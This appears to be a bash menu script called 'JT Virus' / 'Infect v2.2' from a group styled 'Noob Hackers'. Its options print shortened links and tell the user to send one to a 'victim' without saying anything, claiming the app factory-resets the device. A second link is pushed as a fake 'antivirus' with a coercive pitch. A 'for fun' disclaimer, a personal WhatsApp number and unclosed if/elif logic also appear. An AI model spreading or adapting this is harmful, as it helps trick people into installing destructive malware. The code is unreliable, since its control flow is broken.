#I will like to give credit to noob hackers for this awesome script

red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
vid
echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   JT Virus v1     @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        Noob Hackers
'
echo " " 
echo -e "$red                       ▶Coded by$red Timmy$red◀$rset"
# Functions
echo -e "$red                    kill them$blue"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   Infect v2.2      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        Noob Hackers
'
echo " " 
echo -e "$red                       ▶Coded by$grn Timmy$red◀$rset"
echo -e "$red                      ⫸$ylo  JT$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Infect them with fun]$rset"
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribe"
echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"                      
echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
echo " "
echo " "
echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92m#SELECT OPTION\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
virus(){
################
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[91m 😈  Copy below link and send it your victim and 
say nothing to him. when he install it in his/her
device it will be factory reset and lot more happens.
                                👇👇👇
         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
                                 👆👆👆
Use only for fun purpose not for harming someone 😇✌️.
I am not responsible for any kind of loss 
you do to other's by this script."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo " "
echo -e "\e[93m  Copy below link and send it your victim and tell him
that he should install this application or else his 
device will not be recovered.( Jt Antivirus)
                    👇👇👇
        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
                    👆👆👆
Use only for fun purpose not for harming someone 😇✌️. 
And our channel is not responsible for any kind of 
loss you do to other's by this script."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
echo -e "$red                    [message this number on WhatsApp 2348050261876]$rset"
}
upd(){
echo -e "$red                    [No update for now]$rset"
}
banner
menu
